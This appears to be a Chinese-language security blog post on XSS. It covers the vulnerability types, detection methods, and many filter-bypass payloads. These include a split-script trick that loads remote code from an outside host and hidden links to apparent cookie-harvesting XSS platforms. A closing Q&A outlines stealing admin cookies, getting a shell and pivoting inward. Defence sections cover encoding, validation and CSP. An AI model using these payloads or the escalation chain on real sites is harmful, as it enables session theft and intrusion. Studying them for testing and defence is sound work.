---
title: XSS 跨站脚本漏洞
date: 2020-1-22 20:08:00
---

## XSS跨站原理

当应用程序发送给浏览器的页面中包含用户提交的数据，但没有经过适当验证或转义时，就会导致跨站脚本漏洞。这个“跨”实际上属于浏览器的特性，而不是缺陷;

浏览器同源策略：只有发布Cookie的网站才能读取Cookie。

会造成Cookie窃取、劫持用户Web行为、结合CSRF进行针对性攻击等危害

### 反射型

出现在搜索栏，用户登录等地方，常用来窃取客户端的Cookie进行钓鱼欺骗。(需要用户去点击)

想要窃取cookie要满足两个条件：

> 1.用户点击攻击者构造的URL
>
> 2.访问被攻击的应用服务(即存在xss的网站)

### 存储型

出现在留言、评论、博客日志等交互处，直接影响Web服务器自身安全

### DOM型

基于文档对象模型(Document Object Model)的一种漏洞；

DOM型与反射型类似，都需要攻击者诱使用户点击专门设计的URL；

Dom型 xss 是通过 url 传入参数去控制触发的；

Dom型返回页面源码中看不到输入的payload， 而是保存在浏览器的DOM中。

**假设应用程序返回的页面包含以下脚本：**

```javascript
<script>
    var url = document.location;
    url = unescape(url);
    var message = url.substring(url.indexOf('message=') + 8,url.length);
    document.write(message);
</script>
```

把 javascript 代码作为message的参数，这段代码将会被动态的写入到页面中，

并像服务器返回代码一样得以执行。

DOM型与反射 型类似，都需要攻击者诱使用户点击专门设计的URL

## 查找利用XSS漏洞

### 基本验证

```javascript
"><script>alert(document.cookie)</script>
```

把这个字符串提交给每个应用程序页面的每个参数；

同时监控它的响应，如果攻击字符串原样出现在响应中，就可能存在XSS漏洞。

许多应用可能会经过黑名单等简单的初步过滤，试图阻止XSS攻击；

可以通过编码等方式绕过：

```javascript
"><ScRiPt>alert(document.cookie)</ScRiPt>
"%3e%3cscript%3ealert(document.cookie)%3c/script%3e
"><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
%00"><script>alert(document.cookie)</script>
```

当利用基于DOM的XSS漏洞时，攻击有效载荷并不在服务器的响应中返回，而是保存在浏览器的DOM中，并可被客户端javascript访问。

在这种情况下，以上基本验证无法发现XSS漏洞。

## 查找反射型XSS

#### 测试引入脚本的反射

**例1**，标签属性值：

假设返回页面中包含以下脚本：

```javascript
<input type="text" name="name" value="test-text" >
```

很明显，利用xss的方法是终止包含字符串的双引号，结束``标签

```javascript
"><script>alert(1)</script>
```

**例2**，javascript字符串：

假设返回页面中包含以下脚本：

```javascript
<script>var a='test-text'; var b=123;...</script>
```

用分号终止语句

```javascript
'; alert(1); var foo='
```

**例3**，包含URL的特性

假设返回页面中包含以下脚本：

```javascript
<a href="test-text">Click here</a>html
```

这时，受控制的字符插入到一个``标签的`href`属性中。

这个属性可能包含一个使用`javascript:`协议的URL，利用：

```javascript
javascript:alert(1);
```

#### 脚本标签

**事件处理器**

有大量事件处理器可与各种标签结合使用，用于执行脚本。

一些示例，可在不需要任何用户交互的情况下执行脚本：

```javascript
<style onreadystatechange=alert(1)></style>
<iframe onreadystatechange=alert(1)></iframe>
<object onerror=alert(1)></object>
<img type=image src=valid.gif onreadystatechange=alert(1)>
<input type=image src=valid.gif onreadystatechange=alert(1)>
<body onbeforeactivate=alert(1)></body>
<video src=1 onerror=alert(1)></video>
<audio src=1 onerror=alert(1)>
```

**脚本伪协议**

脚本伪协议可用在任何位置，以在需要URL的属性中执行行内脚本。

```javascript
<object data=javascript:alert(1)></object>
<iframe src=javascript:alert(1)></iframe>
<event-source src=javascript:alert(1)></event-source>
```

#### 避开过滤:HTML

**标签名称**

改变字符大小写

```javascript
<iMg onerror=alert(1) src=a>
```

插入NULL字节

```javascript
<[%00]img onerror=alert(1) src=a>
```

标签名称后的空格

一些可用于替代空格的字符

```javascript
<img[%09]onerror=alert(1) src=a>
<img[%0d]onerror=alert(1) src=a>
<img[%0a]onerror=alert(1) src=a>
<img/"onerror=alert(1) src=a>
```

**属性名称**

绕开一些检查以`on`开头的过滤器

```javascript
<img o[%00]nerror=alert(1) src=a>
```

属性分隔符,把多个属性分隔开

```javascript
<img onerror='alert(1)'src=a>
```

**属性值**

可以用NULL字节或HTML编码属性值

```javascript
<img onerror=a[%00]lert(1) src=a>
<img onerror=a&#x006c;ert(1) src=a>
```

> HTML编码 十六进制编码 base64编码 ASCII编码

以下属性可以被编码：

```javascript
href=
action=
formaction=
location=
on*=
name=
background=
poster=
src=
code=
data= //只支持base64
```

**字符集**

有时可用一些非标准编码绕开过滤器

UTF-7、US-ASCII、UTF-16

**拆分跨站：**

当应用程序没有过滤<、>关键字却限制了字符长度时可用拆分跨站

```javascript
<script>z='<script src=';/*

*/z+='test.c';/*

*/z+='n/1.js><0/script>';/*

*/document.write(z)</script>
```

最终执行

```
<script>

z='undefined<script src=test.cn/1.js></script>';

document.write(z)

</script>
```

#### 避开过滤：脚本代码

有些过滤器可能阻止javascript关键字和表达式，有用的字符，比如引号、括号和圆点。

**Unicode转义**

```javascript
<script>a\u006cert(1)</script>
```

如果能够使用eval命令，就能够将其它命令以字符串的格式传送给eval，从而执行其它 命令。

```javascript
<script>eval('a\u006cert(1)');</script>
```

**替代圆点**

```javascript
<script>alert(document['cookie'])</script>
<script>with(document)alert(cookie)</script>
```

## 查找利用存储型XSS

确定保存型XSS漏洞的过程与前面描述的确定反射型XSS漏洞的过程类似。 

但是，这两个过程之间也存在一些重要的区别；

在进行测试时必须记住这些区别，以确定尽可能多的漏洞。

> (1) 向应用程序的每一个可能的位置提交一个特殊字符串后，必须反复检查应用程序的全部内容与功能；
>
> (2) 如有可能，应检查管理员能够访问的区域，确定其中是否有可以被非管理用户控制的数据；
>
> ​      比如有些应用可以在浏览器查看日志，攻击者可留下恶意的HTML日志加以利用；
>
> (3) 检查应用的整个流程，确保测试彻底，检查任何可控的带外通道，如HTTP消息头；

**在上传文件中测试XSS**

如果应用程序允许用户上传可被其它用户查看下载的文件，就会出现保存型XSS，这种漏洞常被人们忽略。

测试时，首先上传一个验证性的HTML文件。

如果该文件被接受，则尝试以正常方式下载该文件。

如果应用程序按照原样返回最初的文件，并且脚本被执行，则应用肯定易于受到攻击。

**例：**可把XSS的payload做成图片木马，上传到用户头像(用各种方法去绕过上传限制)

## 查找并利用DOM型的XSS漏洞

确定基于DOM型的XSS漏洞，一种有效的方法是，检查所有客户端JavaScript， 

看其中是否使用任何可能会导致漏洞的DOM属性。

工具[DOMTracer](https://www.blueinfy.com/#DOMTracer)可自动完成这个测试过程。

检查每一段客户端JavaScript，看其中是否出现以下API

它们可用于访问通过一个专门设计的URL控制的DOM数据；

```javascript
 document.location
 document.URL
 document.URLUnencoded
 document.referrer
 window.location
```

在每一个使用上述API的位置，仔细检查那里的代码，确定应用程序如何处理用户可控的数据；

以及是否可以使用专门设计的输入来执行JavaScript。

尤其注意检查并测试控制的数据被传送至以下任何一个API的情况

```javascript
document.write()
document.writeln()
document.body.innerHtml
eval()
window.execScript()
window.setInterval()
window.setTimeout()
```

片段技巧：服务器不解析url中#后的内容

## 防止反射型与存储型XSS

用户可控的数据未经适当的确认与净化就被复制到应用程序响应中，这是造成反射型与保存型XSS漏洞的根本原因 

**1.确认输入**

> 数据不能太长
>
> 数据仅包含某组合法字符
>
> 数据与一个特殊的正则表达式相匹配

根据应用程序希望在字段中收到的数据类型，应尽可能的限制性的对姓名、电子邮件地址、账号等

应用不同的确认规则。

**2.确认输出**

如果应用程序将某位用户或第三方提交的数据复制到它的响应中，应对这些数据进行HTML编码，净化恶意代码。

**3.消除危险插入点**

应尽量避免直接在现有的JavaScript中插入用户可控的数据；

如果标签属性接受URL作为它的值，应避免嵌入用户的输入；

**4.允许有限的HTML**

一些应用程序允许用户以HTML格式提交即将插入到应用程序响应中的数据。

例如博客、论坛的富文本编辑器允许使用HTML书写。

有各种框架(如OWASP AntiSamy项目)可用于确认用户提交的HTML标记，以确保其中未包含任何执行JavaScript的方法。

## 防止基于DOM的XSS漏洞

造成这种漏洞并无法不需要将用户可控的数据复制到服务器响应中，所以上述防范方法对DOM型XSS无用；

应用程序应尽量避免使用客户端脚本处理DOM数据并把它插入到页面中；

如果无法避免，应使用以下两种方法防御DOM型XSS攻击。

**1.确认输入**

客户端，确认将要插入到文档中的数据仅包含字母数字与空白符

```javascript
<script>
    var a = document.URL;
    a = a.substring(a.indexOf("message=") + 8, a.length);
    a = unescape(a);
    var regex=/^(A-Za-z0-9+\s)*$/;
    if (regex.test(a))
        document.write(a);
</script>
```

服务端，对URL数据进行严格确认

> 查询字符串中只有一个参数
>
> 参数名大小写检查
>
> 参数值仅包含数字字母

**2.确认输出**

在将用户可控的DOM数据插入到文档之前，进行HTML编码

```javascript
<?php
    function reinit(str)
    {
        var d = document.createElement('div');
        d.appendChild(document.createTextNode(str));
        return d.innerHTML;
    }
?>
```

## 其他 XSS 防范措施

介绍一些通用的方案，可以降低 XSS 带来的风险和后果。

**Content Security Policy**

严格的 CSP 在 XSS 的防范中可以起到以下的作用：

> 禁止加载外域代码，防止复杂的攻击逻辑。
>
> 禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。
>
> 禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。
>
> 禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。
>
> 合理使用上报可以及时发现 XSS，利于尽快修复问题。

**输入内容长度控制**

对于不受信任的输入，都应该限定一个合理的长度。

虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。

**HTTP-only**

HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。

验证码：防止脚本冒充用户提交危险操作。

## xss工具

XSS前端编码：https://github.com/evilcos/xssor2 

Xss-cheat-sheet： https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 

**XSS_Fuzz**

| 官网                                                         | 软件对应科普文                                               |
| :----------------------------------------------------------- | :----------------------------------------------------------- |
| [BruteXSS](https://github.com/ym2011/PEST/tree/master/BruteXSS) | [Freebuf相关科普](https://www.freebuf.com/sectool/109239.html) [汉化版](https://www.cnblogs.com/Pitcoft/p/6341322.html) |
| [XSSfrok](https://github.com/bsmali4/xssfork)                | [Seebug作者教程](https://paper.seebug.org/359/#xssfork)      |

[.](http://xss.fbisb.com/xss.php)

[..](https://xs.sb/xss.php)

## 问题

**如何快速发现 xss 位置 ？**

对于反射型`XSS`：

一般来说就是找输入点的可控参数，比如搜索框、留言板、 登录 / 注册，构造payload发送，监控响应

上边这种方法不适用于DOM型`XSS`，因为 基于DOM的`XSS`漏洞 ， payload并不在服务器的响应中返回，而是保存在浏览器的DOM中

对于存储型`XSS`：正常的输入payload查看是否过滤，也可以反向猜测输出点，构造payload去输入

**XSS 蠕虫的产生条件 ？**

1. 可以执行恶意操作；

2. 可以感染并传播 

   > 就是产生`XSS`点的页面不属于self页面，用户之间产生交互行为的页面，都可能造成XSS Worm的产生 （微博、贴吧）
   >
   > 由于`XSS`蠕虫基于浏览器而不是操作系统，取决于其依赖网站的规模，它可以在短时间内达到对巨大数量的计算机感染 

**`XSS`能打到后台，但是后台系统处于内网，怎么做内网探测？**

`XSS`平台拿cookie登录后台，或钓鱼拿登录，然后找上传点`getshell`，然后结合msf使用

实例参考：https://bbs.ichunqiu.com/thread-46068-1-1.html?from=bkyl

> github有一些现成的xss扫描内网端口的脚本，可以参考利用
>
> 再根据探测出来的信息进一步利用，比如开了redis等，再就是利用漏洞去getshell



